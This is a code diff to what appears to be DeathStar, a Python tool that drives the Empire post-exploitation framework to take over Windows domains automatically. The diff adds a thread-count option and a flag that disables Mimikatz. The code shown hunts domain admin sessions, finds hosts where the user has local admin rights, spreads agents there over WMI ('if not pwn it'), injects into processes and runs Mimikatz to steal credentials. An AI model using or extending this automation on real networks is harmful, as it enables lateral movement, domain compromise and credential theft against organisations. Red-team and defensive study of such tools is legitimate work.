@@ -369,8 +369,7 @@ def get_loggedon(agent_name, computer_name='localhost'):
         if not entry or entry.find('$') != -1:
             continue
         entry = re.sub(' +', ' ', entry.strip())
-        username = entry.split()[0]
-        domain = entry.split()[1]
+        username, domain, *_ = entry.split()
         user = '{}\\{}'.format(domain, username)
         if user not in loggedon_users:
             loggedon_users.append(user)
@@ -477,7 +476,7 @@ def recon(agent_name):
         if not domain_admins and not domain_controllers:
             print_bad('Could not find Domain Admins and Domain Controllers. This usually means something is wrong with the Agent.')
 
-        for session in user_hunter(agent_name, no_ping=True):
+        for session in user_hunter(agent_name, no_ping=True, threads=args.threads):
             if session['hostname'] not in priority_targets:
                 priority_targets.append(session['hostname'])
             if session['sessionfrom'] not in priority_targets:
@@ -499,7 +498,7 @@ def spread(agent_name):
                     if not agent_on_host(hostname=box) and find_localadmin_access(agent_name, no_ping=True, computer_name=box):
                         invoke_wmi(agent_name, box)
 
-            for box in find_localadmin_access(agent_name, no_ping=True):
+            for box in find_localadmin_access(agent_name, no_ping=True, threads=args.threads):
                 # Do we have an agent on the box? if not pwn it
                 if not agent_on_host(hostname=box):
                     invoke_wmi(agent_name, box)
@@ -559,7 +558,7 @@ def pwn_the_shit_out_of_everything(agent_name):
                 psinject(agent_name, process['pid'])
                 psinject_usernames.append(process['username'])
 
-        if agents[agent_name]['os'].lower().find('windows 7') != -1:
+        if not args.no_mimikatz and agents[agent_name]['os'].lower().find('windows 7') != -1:
             mimikatz_thread = KThread(target=mimikatz, args=(agent_name,))
             mimikatz_thread.daemon = True
             mimikatz_thread.start()
@@ -750,6 +749,7 @@ args.add_argument('-u', '--username', type=str, default='empireadmin', help='Emp
 args.add_argument('-p', '--password', type=str, default='Password123', help='Empire password (default: Password123)')
 args.add_argument('-lp', '--listener-port', type=int, default=8443, metavar='PORT', help='Port to start the DeathStar listener on (default: 8443)')
 args.add_argument('-t', '--threads', type=int, default=20, help='Specifies the number of threads for modules to use (default: 20)')
+args.add_argument('--no-mimikatz', action='store_true', help='Do not use Mimikatz during lateral movement (default: False)')
 args.add_argument('--url', type=str, default='https://127.0.0.1:1337', help='Empire RESTful API URL (default: https://127.0.0.1:1337)')
 args.add_argument('--debug', action='store_true', help='Enable debug output')
 
